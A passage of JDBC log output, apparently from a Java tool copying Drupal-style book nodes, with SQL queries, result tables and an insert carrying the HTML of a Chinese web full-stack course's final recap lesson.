|----------|-------|------|-----------------|---------|------------|

2020-11-19 10:59:42.030 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=2 
 {executed in 0 msec}
2020-11-19 10:59:42.031 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|2   |1   |2     |1            |1  |2  |0  |0  |0  |1   |0      |
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 10:59:42.034 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:59:42.035 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|2         |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:59:42.036 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.037 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|[unread]  |           |             |book   |0     |full_html   |zh-hans  |2           |
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 10:59:42.041 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:59:42.042 INFO  jdbc.resultsettable Line:610 - 
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|nid |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |type |uid |vid |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|
|2   |1605754553 |1605754553 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |book |1   |2   |
|----|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|-----|----|----|

2020-11-19 10:59:42.044 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=2 
 {executed in 1 msec}
2020-11-19 10:59:42.045 INFO  jdbc.resultsettable Line:610 - 
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|nid      |changed    |created    |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title        |uid |vid |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|
|[unread] |1605754553 |1605754553 |1                |zh-hans  |0       |1                             |1      |0      |07丨全栈回顾 (1讲) |1   |2   |
|---------|-----------|-----------|-----------------|---------|--------|------------------------------|-------|-------|-------------|----|----|

2020-11-19 10:59:42.046 INFO  jdbc.sqltiming Line:373 - update node_field_data set changed=1605754782, created=1605754782, default_langcode=1, langcode='zh-hans', 
promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 (1讲)', type='book', 
uid=1, vid=2 where nid=2 
 {executed in 0 msec}
2020-11-19 10:59:42.047 INFO  jdbc.sqltiming Line:373 - update node_field_revision set changed=1605754782, created=1605754782, default_langcode=1, 
langcode='zh-hans', promote=0, revision_translation_affected=1, status=1, sticky=0, title='07丨全栈回顾 
(1讲)', uid=1, vid=2 where nid=2 
 {executed in 0 msec}
2020-11-19 10:59:42.052 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:59:42.052 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|2         |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:59:42.054 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.055 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|[unread]  |book   |0     |zh-hans  |                  |2           |
|----------|-------|------|---------|------------------|------------|

2020-11-19 10:59:42.056 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.057 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|2         |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:59:42.059 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.060 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|[unread]  |book   |                    |0     |full_html            |zh-hans  |2           |
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 10:59:42.061 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.062 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|2         |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:59:42.063 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.064 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|[unread]  |book   |0     |zh-hans  |2           |                  |
|----------|-------|------|---------|------------|------------------|

2020-11-19 10:59:42.065 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=2 
 {executed in 0 msec}
2020-11-19 10:59:42.066 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 10:59:42.068 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=2 
 {executed in 1 msec}
2020-11-19 10:59:42.068 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|[unread]  |book   |0     |1                      |zh-hans  |2           |
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:00:26.384 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='71438951108017' 
 {executed in 1 msec}
2020-11-19 11:00:26.384 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.396 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754826, 1) 
 {executed in 0 msec}
2020-11-19 11:00:26.397 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754826, 1) 
 {executed in 0 msec}
2020-11-19 11:00:26.399 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|3             |
|--------------|

2020-11-19 11:00:26.411 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '1ca40684-a6c1-479d-8594-a242029a060e', 
3) 
 {executed in 0 msec}
2020-11-19 11:00:26.412 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '1ca40684-a6c1-479d-8594-a242029a060e', 3) 
 {executed in 1 msec}
2020-11-19 11:00:26.412 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|3             |
|--------------|

2020-11-19 11:00:26.417 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=3, revision_default=1, revision_timestamp=1605754826, 
revision_uid=1 where vid=3 
 {executed in 0 msec}
2020-11-19 11:00:26.424 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.424 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.427 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '71438951108017', 'zh-hans', 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.432 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.432 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.434 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '71438951108017', 'zh-hans', 3, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.438 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=3 
 {executed in 0 msec}
2020-11-19 11:00:26.439 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:00:26.440 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=3 
 {executed in 0 msec}
2020-11-19 11:00:26.440 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:00:26.441 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 2, 3, 0, 0, 2, 0, 3) 
 {executed in 0 msec}
2020-11-19 11:00:26.445 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.446 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.447 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=3 
 {executed in 0 msec}
2020-11-19 11:00:26.447 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.456 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="928" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-5b3bdcd9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="929"> <span data-slate-object="text" data-key="930"><span data-slate-leaf="true" 
data-offset-key="930:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-d5bb7d18 " data-slate-type="paragraph" data-slate-object="block" data-key="931"> 
<span data-slate-object="text" data-key="932"><span data-slate-leaf="true" data-offset-key="932:0" 
data-first-offset="true"><span data-slate-string="true">这是这个专栏的最后一讲了。</span></span></span> 
</div> <h2 class="se-5fcad9b1" data-slate-type="heading" data-slate-object="block" data-key="933"><span 
data-slate-object="text" data-key="934"><span data-slate-leaf="true" data-offset-key="934:0" 
data-first-offset="true"><span data-slate-string="true">回顾一下，我们学到了什么？</span></span></span></h2> 
<div class="se-eb31d66e " data-slate-type="paragraph" data-slate-object="block" data-key="935"> 
<span data-slate-object="text" data-key="936"><span data-slate-leaf="true" data-offset-key="936:0" 
data-first-offset="true"><span data-slate-string="true">现在，是时候来回顾一下我们学过的 Web 全栈树了。这里我按章节进行划分，把每一讲的标题和主要内容做成了一张思维导图，帮助你回顾。</span></span></span> 
</div> <div class="se-b9e7b880" data-slate-type="image" data-slate-object="block" data-key="937"> 
<img class="se-4334ba90" src="https://static001.geekbang.org/resource/image/29/4a/2961de2a299d887fefa7731dc8d28a4a.png"> 
</div> <div class="se-f0bd987b " data-slate-type="paragraph" data-slate-object="block" data-key="938"> 
<span data-slate-object="text" data-key="939"><span data-slate-leaf="true" data-offset-key="939:0" 
data-first-offset="true"><span data-slate-string="true">下面我把它展开来，你可以顺着这个展开的内容，回顾自己所学。</span></span></span> 
</div> <h3 class="se-3ded67bd" data-slate-type="heading" data-slate-object="block" data-key="940"><span 
data-slate-object="text" data-key="941"><span data-slate-leaf="true" data-offset-key="941:0" 
data-first-offset="true"><span data-slate-string="true">第一章：网络协议和 Web 接口</span></span></span></h3> 
<div class="se-b11b2856 " data-slate-type="paragraph" data-slate-object="block" data-key="942"> 
<span data-slate-object="text" data-key="943"><span data-slate-leaf="true" data-offset-key="943:0" 
data-first-offset="true"><span data-slate-string="true">第一章是网络协议和 Web 接口，我以 HTTP 为核心，介绍了它的演进历史、相关技术，以及它的局限性：</span></span></span> 
</div> <div class="se-0da04aaf" data-slate-type="list" data-slate-object="block" data-key="944"> 
<div class="se-b5582af6 se-4b5d5342" data-slate-type="list-line" data-slate-object="block" 
data-key="945"> <span data-slate-object="text" data-key="946"><span data-slate-leaf="true" 
data-offset-key="946:0" data-first-offset="true"><span data-slate-string="true">对于安全传输方面的局限，我介绍了 
HTTPS 的原理；</span></span></span> </div> <div class="se-807c7aab se-9ac48236" data-slate-type="list-line" 
data-slate-object="block" data-key="947"> <span data-slate-object="text" data-key="948"><span 
data-slate-leaf="true" data-offset-key="948:0" data-first-offset="true"><span data-slate-string="true">对于交互模式上的局限，我介绍了一些服务端推送技术；</span></span></span> 
</div> <div class="se-1f2e4218 se-57540395" data-slate-type="list-line" data-slate-object="block" 
data-key="949"> <span data-slate-object="text" data-key="950"><span data-slate-leaf="true" 
data-offset-key="950:0" data-first-offset="true"><span data-slate-string="true">对于无状态连接的局限，在第五章我介绍了客户端和服务端的会话。</span></span></span> 
</div> </div> <div class="se-c4f6f7b9 " data-slate-type="paragraph" data-slate-object="block" 
data-key="951"> <span data-slate-object="text" data-key="952"><span data-slate-leaf="true" 
data-offset-key="952:0" data-first-offset="true"><span data-slate-string="true">也是从这一章开始，我们开始接触了 
push 和 pull 这两个“对立”的套路，对于整个专栏，我们在各个层面的技术中把它们拿出来反复比较，权衡利弊。</span></span></span> </div> <div 
class="se-f29e43b1 " data-slate-type="paragraph" data-slate-object="block" data-key="953"> 
<span data-slate-object="text" data-key="954"><span data-slate-leaf="true" data-offset-key="954:0" 
data-first-offset="true"><span data-slate-string="true">对于 Web 接口部分，我从 SOAP 和 REST 所代表的两大设计风格开始，梳理了 
Web 接口设计的过程，以及需要考虑的零零总总各个方面。</span></span></span> </div> <h3 class="se-77b435fe" data-slate-type="heading" 
data-slate-object="block" data-key="955"><span data-slate-object="text" data-key="956"><span 
data-slate-leaf="true" data-offset-key="956:0" data-first-offset="true"><span data-slate-string="true">第二章：欢迎来到 
MVC 的世界</span></span></span></h3> <div class="se-e16f3a5d " data-slate-type="paragraph" data-slate-object="block" 
data-key="957"> <span data-slate-object="text" data-key="958"><span data-slate-leaf="true" 
data-offset-key="958:0" data-first-offset="true"><span data-slate-string="true">第二章我主要针对 MVC 
这个对于网站和其它 Web 应用开发来说，最重要的架构和设计模式，介绍演进、分层，并逐层仔细深挖：</span></span></span> </div> <div class="se-bf3c628f" 
data-slate-type="list" data-slate-object="block" data-key="959"> <div class="se-01817fd3 se-25892bc2" 
data-slate-type="list-line" data-slate-object="block" data-key="960"> <span data-slate-object="text" 
data-key="961"><span data-slate-leaf="true" data-offset-key="961:0" data-first-offset="true"><span 
data-slate-string="true">模型层，我介绍了贫血模型和充血模型，以及常见的 CQRS 模式；</span></span></span> </div> <div 
class="se-471c6b55 se-97ca79bc" data-slate-type="list-line" data-slate-object="block" data-key="962"> 
<span data-slate-object="text" data-key="963"><span data-slate-leaf="true" data-offset-key="963:0" 
data-first-offset="true"><span data-slate-string="true">视图层，页面聚合是我们的重点，包括客户端聚合和服务端聚合，特别是模板引擎的工作原理；</span></span></span> 
</div> <div class="se-4c30cf6e se-db31c0d4" data-slate-type="list-line" data-slate-object="block" 
data-key="964"> <span data-slate-object="text" data-key="965"><span data-slate-leaf="true" 
data-offset-key="965:0" data-first-offset="true"><span data-slate-string="true">控制器层，我把这一层拆分为几个方面，梳理了控制器在 
MVC 架构中的工作步骤。</span></span></span> </div> </div> <div class="se-7866cb7a " data-slate-type="paragraph" 
data-slate-object="block" data-key="966"> <span data-slate-object="text" data-key="967"><span 
data-slate-leaf="true" data-offset-key="967:0" data-first-offset="true"><span data-slate-string="true">之后我们将 
MVC 泛化，了解了其它重要的设计模式和套路，包括 AOP 和 IoC，以及实现切面编程所需的代理技术；还有其它著名的 JavaEE 模式，特别是拦截过滤器和数据访问对象模式。</span></span></span> 
</div> <h3 class="se-6733a337" data-slate-type="heading" data-slate-object="block" data-key="968"><span 
data-slate-object="text" data-key="969"><span data-slate-leaf="true" data-offset-key="969:0" 
data-first-offset="true"><span data-slate-string="true">第三章：从后端到前端</span></span></span></h3> 
<div class="se-00b38802 " data-slate-type="paragraph" data-slate-object="block" data-key="970"> 
<span data-slate-object="text" data-key="971"><span data-slate-leaf="true" data-offset-key="971:0" 
data-first-offset="true"><span data-slate-string="true">第三章主要讲前端技术。首先我从一个大体上俯瞰的角度，阐述了我所理解的前端技术的“不同”，特别是思维模式的不同。</span></span></span> 
</div> <div class="se-73606031 " data-slate-type="paragraph" data-slate-object="block" data-key="972"> 
<span data-slate-object="text" data-key="973"><span data-slate-leaf="true" data-offset-key="973:0" 
data-first-offset="true"><span data-slate-string="true">然后我介绍了一些前端技术重要的知识点，比如 JavaScript 面向对象，包括封装、继承和多态的实现方式，也包括对象创建的原理。接着我以 
React 和 Angular，以及它们的重要特性为例，介绍了百花齐放的前端 MVC 框架为我们带来的变革。</span></span></span> </div> <div class="se-0d6ef2c8 
" data-slate-type="paragraph" data-slate-object="block" data-key="974"> <span data-slate-object="text" 
data-key="975"><span data-slate-leaf="true" data-offset-key="975:0" data-first-offset="true"><span 
data-slate-string="true">在页面设计和交互布局一讲中，我使用实际例子介绍了页面设计方面的一些原则和思路，包括渐进增强和优雅降级等等。</span></span></span> 
</div> <div class="se-b064b7e6 " data-slate-type="paragraph" data-slate-object="block" data-key="976"> 
<span data-slate-object="text" data-key="977"><span data-slate-leaf="true" data-offset-key="977:0" 
data-first-offset="true"><span data-slate-string="true">接着在数据可视化一讲中，我仔细比较了当今最重要的两种 Web 绘图标准，SVG 
和 Canvas，并介绍了 Flot 和 D3.js 这两个可视化的库。</span></span></span> </div> <div class="se-71622bf5 " 
data-slate-type="paragraph" data-slate-object="block" data-key="978"> <span data-slate-object="text" 
data-key="979"><span data-slate-leaf="true" data-offset-key="979:0" data-first-offset="true"><span 
data-slate-string="true">最后是 JavaScript 异步编程的技术，我们重新回归 JavaScript，我梳理了最重要的几个技术要点，这也是这一章相对比较难的一讲。</span></span></span> 
</div> <h3 class="se-007fa24e" data-slate-type="heading" data-slate-object="block" data-key="980"><span 
data-slate-object="text" data-key="981"><span data-slate-leaf="true" data-offset-key="981:0" 
data-first-offset="true"><span data-slate-string="true">第四章：数据持久化</span></span></span></h3> 
<div class="se-86711bed " data-slate-type="paragraph" data-slate-object="block" data-key="982"> 
<span data-slate-object="text" data-key="983"><span data-slate-leaf="true" data-offset-key="983:0" 
data-first-offset="true"><span data-slate-string="true">继续往技术栈的下方挖，数据持久化。在这一章的一开始，我首先介绍了这一层中互联网应用最广泛的技术之一——缓存，讲了它的本质、应用和常见的坑，以及缓存框架的设计要点。</span></span></span> 
</div> <div class="se-d8f08ed0 " data-slate-type="paragraph" data-slate-object="block" data-key="984"> 
<span data-slate-object="text" data-key="985"><span data-slate-leaf="true" data-offset-key="985:0" 
data-first-offset="true"><span data-slate-string="true">接着是数据一致性，我介绍了它的概念，还有围绕它而产生的常见架构技术。有了数据一致性的基础知识，我们就进一步学习了 
CAP 的原理，包括它的本质、常见的误区，以及我们该怎样根据 CAP 去做技术选型。</span></span></span> </div> <div class="se-b6d1c6e3 
" data-slate-type="paragraph" data-slate-object="block" data-key="986"> <span data-slate-object="text" 
data-key="987"><span data-slate-leaf="true" data-offset-key="987:0" data-first-offset="true"><span 
